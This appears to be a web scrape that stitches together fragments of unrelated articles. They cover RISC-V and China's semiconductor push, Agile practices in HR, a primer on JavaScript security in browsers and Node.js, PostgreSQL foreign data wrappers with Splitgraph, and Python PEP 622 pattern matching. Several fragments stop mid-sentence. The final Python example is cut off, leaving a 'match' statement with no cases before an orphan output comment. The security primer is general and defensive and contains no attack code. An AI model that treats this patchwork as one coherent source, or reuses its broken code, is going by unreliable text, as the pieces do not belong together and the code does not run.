                    <p>【想看中文的<a href="https://interconnected.blog/riscv-china-nightingales/#chinese-version-below">读者请点击这里</a>或滚动到本页下方】</p><p>Last weekend, I read <a href="https://www.huxiu.com/article/360061.html">a long, epic piece of techlore</a> that chronicled the fierce and bitter rivalry between TSMC and Samsung in their fight to become the world’s number 1 chip foundry, which stretched back three decades and continues today.</p><p>Among the many dramatic details was the “Nightingale program” that TSMC started in the mid-2010s to jumpstart its R&amp;D, because it was falling behind Samsung and losing Apple’s A9 chip orders to the Korean conglomerate. TSMC conceived of a three-shift, 24-hour non-stop R&amp;D operation, taking a page out of their fellow Taiwanese manufacturing behemoth Foxconn’s assembly operation. The “Nightingales” were engineers and researchers, who were willing to work the “graveyard shift” for a 30% increase in base salary and 50% increase in dividend payout. Due to this program, <strong>the total working hours clocked in Taiwan in 2014 was 2135</strong>, apparently the most of any economy in the world that year.</p><p>TSMC, and arguably Taiwan’s entire economy, was confronting an existential struggle at that time. SMIC (the largest chip foundry in China), and arguably China’s technological and economic future, is confronting a similarly existential struggle on a larger scale.</p><p>There are many interconnected elements that, when put together, could determine how China will come out on the other end of this struggle -- <strong>RISC-V, foundry technology, the “New Infrastructure” stimulus program, open source, and a few key TSMC personnels</strong>, who are now at the helm of China’s semiconductor industry.</p><p>Let’s take a look at each of them, sequentially and interconnectedly.</p><h2 id="risc-v-strengths-and-weaknesses">RISC-V: Strengths and Weaknesses</h2><p>The conversation around China’s journey towards technological self-reliance often involves <strong>RISC-V</strong> -- an open standard Instruction Set Architecture (ISA) for hardware that’s under open source licenses, thus any one can run, change, copy, and distribute it, in accordance with<a href="https://www.gnu.org/philosophy/free-sw.en.html"> the four freedoms</a> of open source.</p><figure><img src="https://lh6.googleusercontent.com/sVMZ8L3CA61u_kc0hdRdB9AItYEuK65vUJ70os7CAaFpogycLyqhYL_BbwMndKktijiEAF8Bi9WLyKCmW5ztmGE3Zhw2dQrRP0VwWcxWIsUqTFVFfYXIS4K5wp_SDExCRiug0cE1" alt=""><figcaption>RISC-V Ecosystem, courtesy of SiFive.</figcaption></figure><p>However, RISC-V is still young. Its<a href="https://riscv.org/specifications/"> user-space ISA</a> and<a href="https://riscv.org/specifications/privileged-isa/"> privileged ISA</a> wasn’t frozen, and thus ready for large-scale software and hardware development, until June 2019. The technology and community ecosystem is maturing, and support from large Chinese organizations has a lot to do with it. Of <a href="https://riscv.org/members-at-a-glance/">the six Premier Members</a> of the official RISC-V foundation, RISC-V International, &nbsp;four are Chinese organizations -- Alibaba, Huawei, RIOS Lab, and the Institute of Computing Technology of the Chinese Academy of Sciences.</p><p>But in the near future (say the next five years), what can RISC-V, the technology, realistically enable China to accomplish?</p><p><strong>What is it good for?</strong> &nbsp;RISC-V is a very good foundation for rapidly prototyping and building <strong>special purpose</strong> chips. The development cycle and experience feels closer to software than hardware. This speed in development is partly because it’s open-sourced -- no hassle in getting a commercial license, as oppose to its proprietary counterparts like ARM -- and also partly because the ISA itself is simplified and “reduced” (i.e. the R in RISC), as opposed to CISC (the C means “complex”) which underpins more powerful, proprietary ISAs like Intel’s x86. This reduced architecture enables and optimizes simple computation instructions well, literally elementary school math: addition, subtraction, multiplication, division, etc. It’s less capable of supporting complex mathematical operations, like matrix multiplication and partial derivative (used widely in Deep Learning AI).</p><p>Thus, in reality, chips designed using RISC-V have been used most commonly in <strong>IoT and embedded systems</strong> scenarios. Because of its simplicity and malleability, RISC-V chips also <strong>tend to have low power consumption</strong>, which is a good attribute when battery life is an issue, e.g. wearable devices. This reduced simplicity also means that the compiler (the software layer that translates code, like C, into machine instructions for a chip to execute) does not need to be purposefully designed to optimize performance on RISC-V. Using some common compilers <a href="https://riscv.org/software-status/#c-compilers-and-libraries">like GCC, which RISC-V </a>supports, will do.</p><p><strong>What does it lack? </strong>As you might’ve guessed, RISC-V’s reduced simplicity is also the source of its limitations. While many people like to pit RISC-V against a general purpose ISAs, like Intel’s, <strong>they are more compliments than competitors. </strong>In fact, special purpose RISC-V chips that accelerate certain computations for AI workloads do run side-by-side along general purpose Intel chips in the cloud. It’ll be a long time (more than five years, in my opinion) before RISC-V can enable the design of a <strong>general purpose</strong> chip that powers our iPhones, laptops, or cloud computing servers in a data center, with enough developers incentivized to both extend the ISA and the compiler and other infrastructure software on top of it.</p><p><strong>Can RISC-V become general purpose some day?</strong> Of course. <strong>But that’s not an inevitability</strong>. It’s <strong>a strategic choice</strong> that the RISC-V community can make and work towards, with all the complexity in upstream coordination, developer community building, and open governance, not to mention the work of building the technology itself, that must be executed collectively. That possible future is perhaps the most interesting question when we think about China’s self-reliance, which I’ll discuss in more detail below <strong>in the context of fostering open source</strong>.</p><h2 id="-new-infrastructure-">“New Infrastructure”</h2><p>With the strengths and weaknesses of RISC-V in mind, let’s see where RISC-V chips could get deployed in China’s economy and infrastructure in the foreseeable future.</p><p>It’s no secret that central government industrial policy matters a lot in China, even though its market-driven economy is what materializes much of that vision. The most relevant piece of policy is <a href="http://www.china.org.cn/business/2020-04/22/content_75961988.htm">the “New Infrastructure” spending plan </a>that came out of the National Development and Reform Commission, as a response to the COVID-19 pandemic to boost the economy. This infrastructure stimulus plan sits in a larger context of two other long-term strategic plans: Made in China 2025 and China Standards 2035.</p><p>The details of this “New Infrastructure” plan have emerged in the last couple months, with major emphasis in IT and digital infrastructure, not just traditional infrastructure like highways and railroads. As it often happens in China, the signals sent from the top have already shifted private investment dollars. Nascent chip startups, all of a sudden, are <a href="https://uk.reuters.com/article/uk-china-semiconductors-analysis/sino-u-s-tech-race-turbo-charges-china-chip-investment-triggering-bubble-fear-idUKKBN23V3CO">enjoying investor attention and bubbly valuations</a>.</p><p>With that said, here are some of the “New Infrastructure” sectors that I think RISC-V could play an immediate role in, given its strengths:</p><ul><li>IoT</li><li>Smart transportation</li><li>New energy vehicle chargers</li><li>Limited AI (specific workloads that need customized acceleration)</li><li>Autonomous vehicles (limited to certain types of sensors and data collection)</li></ul><p>And as for sectors that I don’t see RISC-V making much of a dent, given its current limitations:</p><ul><li>Cloud computing</li><li>5G (both base station construction and consumer devices)</li><li>Blockchain</li><li>Data centers</li><li>Big data</li><li>Large-scale AI training and production deployment</li></ul><p>As you can see, RISC-V impact would be limited,<strong> but not insignificant</strong>. The logical next step would be for China to help evolve RISC-V <strong>into a more general purpose ISA</strong>, and reduce its reliance on proprietary solutions from ARM or Intel that could always be subjected to more sanctions.</p><p>The path to that end would have to be fostering open source <strong>and doing it the right way.</strong></p><h2 id="fostering-open-source-the-right-way">Fostering Open Source, the Right Way</h2><p>Open source has been popping up in <a href="https://mp.weixin.qq.com/s/Qcze4R-7zL2wjMh_DNVCIQ">a lot of discussions</a> in various Chinese technical and R&amp;D communities, triggered in particular by MATLAB being now off-limit to Chinese universities that are on the U.S. export control entity list. The discussion inevitably leads to open source: are there open source alternatives to MATLAB? What about CAD softwares, like EDA tools, which every chip foundry needs? Will there be an open source EDA option?</p><p>Implicit in these discussions is a predominant “takers” mentality towards open source. In China, open source solutions are mostly seen as “free stuff” that you can take and use, without any expectation or incentive to give back (or in open source parlance: “contribute upstream”).</p><p>It’s already happening in RISC-V. Alibaba <a href="https://www.techspot.com/news/81177-china-alibaba-making-16-core-25-ghz-risc.html">sports the fastest RISC-V based processor to date</a>, but there’s no intention to my knowledge for the design to also be open-sourced or at least publicly shared for the benefit of the ecosystem. Many small startups in China, now showered with new investments, are doing the same -- using RISC-V to make special purpose chips that are effectively proprietary.</p><p><em>(This is not to generalize that all Chinese organizations are bad open source players; some are contributing a lot and have open source in their DNA. I’ve profiled many of the big tech firms and some startups from the lens in Part II of my “</em><a href="https://interconnected.blog/open-source-in-china-the-game/"><em>Open Source in China</em></a><em>” series.)</em></p><p><strong>If</strong> China hopes to evolve RISC-V into a more powerful, general-purpose building block to achieve semiconductor self-reliance, Chinese organizations, both individually and collectively, would have to shift from a zero-sum “takers” mentality to a positive-sum “stakeholders” mentality. What that means in reality is absorbing and practicing the open source way of doing things -- not just contributing code upstream and being more willing to share, but also behaviors like transparent governance, open discussions with other stakeholders and developers, and clear due process for decision-making, big and small. <strong>These are both technical and human complexities.</strong></p><p>With an existential struggle at hand, there’s reason to believe that Chinese companies may behave differently for the sake of achieving a national imperative and be less concerned about the tit-for-tat, zero-sum nature of market competition, which is quite cutthroat in China. And<strong> if done right</strong>, RISC-V could unleash massive technological innovation broadly and help China deal with its existential struggle specifically.</p><h2 id="foundries-smic-hsmc">Foundries: SMIC, HSMC</h2><p>Let’…</p></div></section></article></div></div></div>

Nowadays, political, social, and technological environments are evolving rapidly. Such changes create further risks and opportunities that may severely influence the way a company operates. For instance, as North American and European countries entered in lock down to combat the spread of the COVID-19 pandemic, several organizations were forced to make the move to remote working, despite not being prepared for it.&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; These massive disruptions have led some organizations to go under, while others fundamentally reinvented their operations to meet their strategic goals. In face of recent challenges, several companies have discovered that they need to be resilient, adaptive, and responsive. All such qualities serve as founding pillars to the Agile methodology, which has become increasingly attractive to companies by promoting faster deployment times and resilient workforces that are flexible and adaptive in the face of challenges and changes.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Arguably, a department that is in need of change in many organizations given recent and prior events is human resources (HR). HR is a key pillar in balancing organizational needs with employee’s priorities, helping to build, operate and foster incentive mechanisms and culture. Conversely, decisions made in areas such as prospecting, training, salary, and career development can heavily impact employee motivation and productivity. This incredibly delicate package can directly translate into a company’s ability to meet its strategic goals such as profitability, market share, productivity and sustainability.&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Traditionally, the HR department was governed by stiff protocols that were meant to instil policy alignment, control, and facilitate vertical structures. This style, often criticized as an obstacle to innovative thinking and resilient teams, has been under scrutiny by the business community in recent years. To bring human resources into the digital age, Agile has been identified by some as an ideal solution to create the right incentives necessary to ensure company success, even if partially implemented – Agile Lite (<a href="https://hbr.org/2018/03/the-new-rules-of-talent-management#hr-goes-agile">HR Goes Agile</a>, HBR).</p></div></div></div><div data-id="48430811" data-element_type="widget" data-widget_type="heading.default"><p><h2>Agile Driven Trends in HR</h2></p></div><div data-id="169f41f3" data-element_type="widget" data-widget_type="text-editor.default"><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unbeknownst to them, some companies have already started to implement Agile practices across their organization, while others have knowingly deployed Agile teams to test the waters. Nevertheless, in many well managed environments, such experiments have proven to be fruitful and have given way to innovative thinking and behaviour.</p></div></div><div data-id="62a25b3e" data-element_type="widget" data-widget_type="heading.default"><p><h3>External Talent Acquisition: Reactive vs. Proactive</h3></p></div><div data-id="5fb1805d" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Traditionally, the modus operandi for bringing new talent was, and still is in most enterprises, reactionary: as positions were made available, a formal search process started, from which a pool of applicants was formed. Once the ideal candidate was identified from the pool of applicants, an incentive package was negotiated and, finally, necessary organizational training was given. This talent acquisition style has its benefits as it ensures that the organization follows controls and policies, however, it can be very time consuming and not necessarily attract or select the best candidate for the position.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Agility driven talent acquisition practices understand the power that a company’s culture has to attract the right personnel. An agile talent acquisition staff becomes less reactive and more proactive in its operational handling. This means that the person is more in tune with the needs of their organization to appropriately forecast personnel needs – this can be done by maintaining a relationship with managers, understanding the turnover ratios on each department, and being attuned to the company’s demographics and needs (ex: what employees are expected to retire soon?).&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; By understanding the organization’s internal environment, talent acquisition members are then able to cultivate relationships across multiple channels (ex: LinkedIn and Universities) and expedite the hiring process should a position become available. It is important to note that this practice does not enforce or condone direct hiring. In fact, it is still advised that talent acquisition staff invite desired candidates to participate in formal hiring processes and, if all boxes are checked, then make an offer to the most qualified individual.</p></div></div></div><div data-id="2166be74" data-element_type="widget" data-widget_type="heading.default"><p><h3>Internal Talent Acquisition: Gigs and Projects</h3></p></div><div data-id="400b0a9" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Inevitably, as organizations’ needs and challenges change, new projects with differing or novel set of skills may appear. Depending on the complexity of the task, consultants or new talent may be brought in. However, for small and short-term projects, the procurement process for new talent or an agency may become too costly, or even risky. In some cases, the skills necessary to fulfill the project may be found in-house. Some forward looking, agility driven organizations have increased their workforce productivity by assigning short-term projects to employees with downtime. For example, should one department require assistance with the automation of a report, they may post the assignment in a board so other members of the company can apply to fulfill the request.</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Such practice has been implemented by the <a href="https://www.cppinvestments.com/">CPP Investment Board</a> and they call it <a href="https://cdn3.cppinvestments.com/wp-content/uploads/2020/05/cpp-investments-annual-report-2020-en.pdf">Gigs</a> (optional short-term assignments). Similar internal talent utilization may prove to be beneficial on several levels:</p><ul><li>It can further collaboration and a sense of community within the organization, which further strengthens corporate culture.</li><li>It can serve as a new challenge for employees who may find themselves underwhelmed by their current routine and wish to spice things up.</li><li>It may assist employees to acquire professional experience of skills that they previously viewed as hobbies (ex: graphical design or photography).</li><li>It may serve to further augment and sediment skills acquired through internal or external courses.</li><li>It can support an employee’s transition into a new career.</li></ul></div></div></div><div data-id="2578c15a" data-element_type="widget" data-widget_type="heading.default"><p><h3>Talent Management: Workforce Upskilling</h3></p></div><div data-id="1b44a92c" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Conventional talent management practices are typically owned by HR and focus on assigning static training for individuals who are preparing for new roles, are underperforming, or need to achieve a specific performance level in a desired practice (<a href="https://tech.gsa.gov/guides/applying_agile_practices_HR/#:~:text=According%20to%20the%20HR%20Trend,workforce%20fluctuations%20to%20demand%2C%20and">GSA</a>). This practice alone may not encourage innovative and proactive behaviour among the workforce and can even hurt engagement levels.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Recently, with technological advances in the are of online learning, Agility driven talent management practices are openly facilitated by HR to any employee who wishes to learn or hone a new skill. As such, internal learning portals are available (or the company has the choice to partner with institutions who offer such service) for employees to choose from a vast selection of topics which can be suggested to them according to identified best practices, or can be selected by them independent of their job. Agility driven HR has also found itself with a lot of untapped data that can be harnessed to drive personalized training. Technology is evolving at a rapid pace, causing organizations to consider workforce upskilling as a major driver in the digital age. HR departments that fail to transition at pace, or faster than its competitors may find itself scrambling compete.</p></div></div></div><div data-id="5131c56b" data-element_type="widget" data-widget_type="heading.default"><p><h2>Agile Framework Adapted to HR</h2></p></div><div data-id="2825630a" data-element_type="widget" data-widget_type="text-editor.default"><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Initially, Agile was a work methodology destined for software development. However, as time passed, other teams and departments started to retrofit its framework to their operations in the hopes of achieving similar results such as higher productivity, engagement, and efficiency. As explained in our previous article from the Agile series, <a href="https://gpetrium.com/agile-sales-department/">The Agile Sales Department</a>, Agile teams have 4 distinct roles: the team lead (in Scrum, also known as Scrum Master), team member, product owner, and stakeholder. Additionally, Agile practices are surrounded by ceremonies that instill team collaboration, autonomy and ownership to reach mutual objectives. Below, let us discuss how roles and ceremonies can both be adapted to further the HR department’s goals and objectives.</p></div></div><div data-id="460bba18" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>The HR Manager</u></strong> is usually tasked with many of the product owner activities. It can range from setting the vision for the team (alongside stakeholders such as Senior HR Manager and Managing Directors), setting priorities, anticipating stakeholder’s needs, overseeing progress, creating key strategic decisions and team targets. At the end of the cycle (or sprint), the HR manager will review the team’s progress and provide relevant guidance for future cycles. Although priorities may differ depending on the company and team, one of the key objectives in this role should be to provide targets and guidance for their HR team depending on their priorities – be it for the compensation team, benefits team, talent management and more.</p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>The Team Facilitator/ Coordinator</u></strong> serves as an intermediator who encourages the team to be the best they can be (balancing time, cost, and quality), while facilitating meetings, managing stakeholders, reinforcing objective oriented actions, and supporting team introspection. The team facilitator is also tasked with shielding the team from internal and external challenges that are not relevant to the current cycle’s objectives. This role is incredibly powerful even more so in organization who are testing the implementation of agile teams by introducing a few teams per department or project.</p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>Team Members</u></strong> are a group of 3-8 individuals, excluding the hr manager and the team facilitator. Their aim is to carry out the goals and objectives of the current cycle to the best of their ability in the allocated time and to take steps in preparation for future sprints.</p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>Stakeholders</u></strong> are other individuals with an interest, concern, or who are affected by the activities of …</p></div></div></div></div></div></div></div></div></section></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>JavaScript has no security model. The runtime environments do. This post is a primer on how to think about JavaScript code security in Web browsers and Node.js.</p><p>JavaScript was created to add interactivity to HTML pages. Web browsers were the first runtime environment for JavaScript code.</p><p>When the user visits a Web page, the browser downloads the HTML code of that page and parses it to create the Document Object Model (DOM). The HTML contains information about other assets that need to be downloaded to render the page to the user. This includes stylesheets (CSS), images, other documents to display in frames, and many more.</p><p>The type of asset we are most interested in here is JavaScript code. It is also downloaded by the browser from locations referenced in the HTML.</p><h2 id="same-origin-policy">Same-Origin Policy</h2><p>Users can simultaneously visit many pages in tabs or separate browser windows. JavaScript code downloaded from multiple different sites is executed in the same browser.</p><p>One of those sites could be infected or operated by an attacker. Is this a risk? Could malicious code compromise the machine or steal data from other sites the user is browsing?</p><p>Browsers protect against this. Each Web site executes JavaScript code in a sandbox. Code downloaded from one Web site cannot read or write data from another site. It also cannot call functions or methods across different sites.</p><p>This is called the <a href="https://web.dev/same-origin-policy/">Same-origin policy</a> (SOP) and it is one of the most fundamental security policies on the Web.</p><h2 id="protecting-code-integrity">Protecting Code Integrity</h2><p>Attackers could breach the SOP through the injection of malicious code at the network level, making the injected code appear as coming from the legitimate site. Browsers use the <a href="https://web.dev/why-https-matters/">secure HTTPS protocol</a> to ensure JavaScript code is downloaded from the legitimate server and that the code is not tampered with in transit.</p><p>JavaScript is often distributed using Content Delivery Networks (CDN). Attackers capable of injecting content into the CDN could also compromise the SOP. <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a> (SRI) provides an additional level of protection that allows HTML code to be cryptographically bound to JavaScript code to prevent this.</p><p>Sandboxing is difficult to implement. Browsers use isolation mechanisms provided by the hardware and the operating system. JavaScript code from different sites is executed in separate processes.</p><p>The code in a sandbox is restricted in what it can do. It cannot directly access devices such as webcams or microphones. The filesystem and the local network are also not directly available.</p><p>JavaScript can use those resources only through very limited APIs. This reduces the attack surface. It also allows the browser to always ask the user for explicit permission before uploading files, capturing the webcam, or listening to the user’s microphone.</p><p>Node.js is a runtime environment for JavaScript based on the V8 engine built for the Google Chrome browser. It allows JavaScript code to be executed outside of the browser, typically on servers.</p><p>Node.js does not use the browser sandbox to run JavaScript. Security properties of both execution environments are different:</p><ul><li><strong>Origin</strong>. Browsers download the code and Node.js loads the code from local files like other popular programming languages.</li><li><strong>Trust</strong>. Browsers treat the code as untrusted and Node.js treats the code with full trust.</li><li><strong>Permissions</strong>. Browsers restrict capabilities the code has access to and Node.js grants all the privileges of the operating system account. This includes access to devices, files, and the local network.<br>Impact on Security</li></ul><p>The same JavaScript script or module can be executed in the browser or Node.js. Potential attacks may be different in both environments. The impact of successful exploits may be drastically different. It is very hard to reason about the security of JavaScript code without a specific execution environment in mind.</p><h2 id="browsers">Browsers</h2><p>A successful attack on JavaScript code running in the browser impacts a single user. The impact is limited to what the sandbox, browser APIs, and the user’s explicit consent allow for.</p><p>Compromised JavaScript script or module runs within the context of an authenticated session of the victim and it can perform actions on behalf of the user. In this scenario, the vulnerable code becomes an attack vector against Web applications the victim has legitimate access to.</p><h2 id="node-js">Node.js</h2><p>A successful attack on Node.js programs may impact the entire server the program runs on. The attacker may get access to all the resources the operating system account has access to, potentially leading to a full compromise of the server.</p><p>The next post in this series will demonstrate how the dynamic type system may lead to subtle security bugs.</p><!--kg-card-begin: html-->

Or, imagine running a <code>JOIN</code> between an SQLite file and an Oracle cluster without having to write and maintain an ETL job.</p><p>In this article, we'll discuss PostgreSQL foreign data wrappers and how <a href="https://www.splitgraph.com/" as="https://www.splitgraph.com/">Splitgraph</a> makes it much easier for anyone to use them.</p></section><section><h2 id="using-a-custom-fdw-with-splitgraph">Using a custom FDW with Splitgraph</h2><p>This example (<a href="https://github.com/splitgraph/splitgraph/tree/master/examples/custom_fdw" as="https://github.com/splitgraph/splitgraph/tree/master/examples/custom_fdw">source code on GitHub</a>) will show you how to write a custom <a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction">foreign data wrapper</a> using Multicorn. <a href="https://github.com/Segfault-Inc/Multicorn" as="https://github.com/Segfault-Inc/Multicorn">Multicorn</a> is a PostgreSQL extension that makes it possible to write foreign data wrappers in Python.</p><p>We will then integrate it with Splitgraph's <a href="https://www.splitgraph.com/docs/sgr/data-import-export/mount" as="https://www.splitgraph.com/docs/sgr/data-import-export/mount"><code>sgr mount</code></a> command.

A UNIX file isn't always pointing to a local file on your disk. It could be a file stored on NFS, in a remote S3 bucket or even a shim that lets you manipulate a device on your machine.</p><p>In UNIX, a file is a pretty strong abstraction that doesn't get broken. An IDE doesn't need to know that the file it's editing is on a remote filesystem. It can work with it by issuing the same ordinary read and write calls. Someone who writes a new filesystem doesn't need to make sure that it's compatible with all existing tools. Instead, they can write a driver that mounts the filesystem to a mountpoint.</p><p>PostgreSQL FDWs resemble mounting in that respect. Foreign tables mostly behave like normal tables and can receive the same <code>SELECT/INSERT/UPDATE/DELETE</code> queries. Behind the scenes, the wrapper's only job is to emit tuples.</p></section><section><h2 id="why-should-i-use-fdws">Why should I use FDWs?</h2><p>Foreign data wrappers are a great alternative to ETL. Instead of loading data into your warehouse that you might never use, you can mount the remote database and query it on demand.</p><p>Because they integrate with the PostgreSQL query planner, FDWs have a decent performance. The FDW can push down qualifiers and even aggregations to the remote database. FDWs can report the rough costs of starting a scan and fetching a tuple back to the query planner. This lets the query planner choose, for example, whether running multiple small single scans or one big one is a better strategy for satisfying a JOIN.</p><p>It's straightforward to write your own FDW and the <a href="https://www.postgresql.org/docs/12/fdwhandler.html" as="https://www.postgresql.org/docs/12/fdwhandler.html">PostgreSQL documentation</a> covers it extensively. The <a href="https://github.com/wikrsh/hello_fdw/" as="https://github.com/wikrsh/hello_fdw/">hello-world FDW</a> that returns "Hello, World" in a table is only a couple hundred lines of C code. If you prefer to focus on development simplicity, you can use Multicorn instead of raw C.</p><p>There are plenty of open-source foreign data wrappers available. They let you query other RDBMSs, NoSQL databases, CSV files or column stores. The <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers" as="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">PostgreSQL wiki</a> lists some of them.</p><p>Using a foreign data wrapper for your database or data source gives you access to a huge ecosystem of software that works with PostgreSQL. We can almost call this a network effect. A new data source that is accessible via an FDW enhances everything that works with PostgreSQL.</p></section><section><h2 id="why-use-fdws-with-splitgraph">Why use FDWs with Splitgraph?</h2><p><a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction">Foreign data wrappers</a> are one of the ways that Splitgraph aims to make data engineers' and data scientists' work easier.</p><p>Splitgraph's <a href="https://www.splitgraph.com/docs/sgr/data-import-export/mount" as="https://www.splitgraph.com/docs/sgr/data-import-export/mount"><code>sgr mount</code></a> command handles the boilerplate around FDW initialization.

<p><a href="https://www.python.org/dev/peps/pep-0622/">PEP 622</a> proposes adding a pattern matching construct to Python. Pattern matching allows the programmer to destructure data with a syntax that mirrors the construction syntax. The proposal brings Python in-line with many other modern programming languages, like Haskell, OCaml, and Rust. However, two features included in the proposal (or-patterns and guards) interact in a perhaps surprising way—see <a href="https://hal.inria.fr/hal-01413241/document">this paper</a> for an explanation of this interaction as it relates to OCaml, another language with both or-patterns and guards.</p>

<p>You can try out an in-progress implementation of this PEP at this fork of cpython: <a href="https://github.com/brandtbucher/cpython/tree/patma">https://github.com/brandtbucher/cpython/tree/patma</a>.</p>

<p>In the rest of this post, I’ll briefly summarize pattern matching, define or-patterns and guards, and show the surprising behavior in the context of Python.</p>

<h2 id="example-of-pattern-matching">Example of pattern matching</h2>

<p>Before the proposal, here’s how you might write a function that classifies a pair of animals according to their kind</p>

<div><div><pre><code><span>class</span> <span>Dog</span><span>:</span>
  <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
    <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

<span>class</span> <span>Cat</span><span>:</span>
  <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>age</span><span>):</span>
    <span>self</span><span>.</span><span>age</span> <span>=</span> <span>age</span>

<span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>if</span> <span>isinstance</span><span>(</span><span>pet</span><span>,</span> <span>Cat</span><span>):</span>
    <span>print</span><span>(</span><span>"A cat that's {} years old"</span><span>.</span><span>format</span><span>(</span><span>pet</span><span>.</span><span>age</span><span>))</span>
  <span>elif</span> <span>isinstance</span><span>(</span><span>pet</span><span>,</span> <span>Dog</span><span>):</span>
    <span>print</span><span>(</span><span>"A dog named {}"</span><span>.</span><span>format</span><span>(</span><span>pet</span><span>.</span><span>name</span><span>))</span>

<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"Fido"</span><span>))</span>
<span># prints: A dog named Fido
</span>
<span>classify</span><span>(</span><span>Cat</span><span>(</span><span>3</span><span>))</span>
<span># prints: A cat that's 3 years old
</span></code></pre></div></div>

<p>Under the proposal, this is how you could write <code>classify</code>:</p>

<div><div><pre><code><span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>):</span>
      <span>print</span><span>(</span><span>"A cat that's {} years old"</span><span>.</span><span>format</span><span>(</span><span>age</span><span>))</span>
    <span>case</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>name</span><span>):</span>
      <span>print</span><span>(</span><span>"A dog named {}"</span><span>.</span><span>format</span><span>(</span><span>name</span><span>))</span>
</code></pre></div></div>

<p>In other words, pattern matching allows you to inspect a piece of data and simultaneously match its shape and bind the value of its fields to variables. In the above code, <code>Cat(age=age)</code> is a <em>pattern</em> that <em>matches</em> <code>Cat</code> values, and <em>binds</em> to the variable named <code>age</code>.</p>

<p>The proposal gives an informal description of the semantics of this construct, but the informal description doesn’t explain the interaction between two of the introduced features: or-patterns, and pattern guards. As it turns out, as currently implemented, the interaction between these features is somewhat surprising, and will probably yield at least one high-scoring Stack Overflow question if this PEP ends up being accepted.</p>

<h2 id="or-patterns">Or-patterns</h2>

<p>Here is an example of an or-pattern: <code>Cat(age=3) | Dog(name="Fido")</code>. This pattern matches either three-year-old cats or dogs named Fido. In practice:</p>

<div><div><pre><code><span># I have a three-year-old cat and a dog named Fido.
# This function returns true if the pet could be mine.
</span><span>def</span> <span>couldBeMyPet</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>3</span><span>)</span> <span>|</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>"Fido"</span><span>):</span>
      <span>return</span> <span>True</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>return</span> <span>False</span>

<span>print</span><span>(</span><span>couldBeMyPet</span><span>(</span><span>Cat</span><span>(</span><span>3</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>couldBeMyPet</span><span>(</span><span>Dog</span><span>(</span><span>"Rover"</span><span>)))</span>
<span># prints False
</span></code></pre></div></div>

<h2 id="pattern-guards">Pattern guards</h2>

<p>Pattern guards are boolean expressions that can be included in a <code>case</code> branch; the case branch is only taken if the pattern guard evaluates to true.</p>

<div><div><pre><code><span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>

<span># prints "I have nothing interesting to say about this pet."
</span></code></pre></div></div>

